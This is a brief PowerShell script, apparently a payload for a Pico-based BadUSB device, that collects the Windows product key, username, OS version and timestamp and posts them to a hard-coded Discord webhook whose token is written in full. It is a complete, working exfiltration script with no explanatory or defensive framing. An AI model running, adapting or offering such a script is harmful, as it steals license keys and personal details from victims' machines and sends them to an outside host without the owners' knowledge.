# COLETA E ENVIO PARA DISCORD
$webhook = "https://discord.com/api/webhooks/1505693050175885342/6LSI1HJR2XcmSAgBP2c-C5wnDhd6CHqh9vBIxIxr6l7ExhN0S2Eiyj4vEAmoL0kQlGkL"
$key = (Get-WmiObject SoftwareLicensingService).OA3xOriginalProductKey
$user = $env:USERNAME
$os = (Get-WmiObject Win32_OperatingSystem).Caption
$data = Get-Date -Format "dd/MM/yyyy HH:mm"

$corpo = @{
    content = "🚀 **Pico-Flipper Report**`n👤 **User:** $user`n🖥️ **OS:** $os`n📅 **Data:** $data`n🔑 **Key:** $key"
} | ConvertTo-Json

Invoke-RestMethod -Uri $webhook -Method Post -Body $corpo -ContentType "application/json"
Write-Host "Missão de coleta concluída!" -ForegroundColor Green
